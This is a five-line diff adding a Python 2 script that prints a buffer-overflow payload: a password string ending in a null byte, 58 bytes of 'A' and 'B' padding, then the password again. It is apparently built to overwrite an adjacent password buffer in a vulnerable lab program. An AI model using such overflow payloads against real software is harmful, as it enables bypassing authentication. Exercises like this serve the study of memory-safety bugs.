@@ -1,0 +1,5 @@
+#!/usr/bin/python
+pwdgive = "shreyase\0"
+str = 'A' * (64-9) + 'B'*3
+pwdchange = "shreyase\0"
+print  pwdgive+str+pwdchange
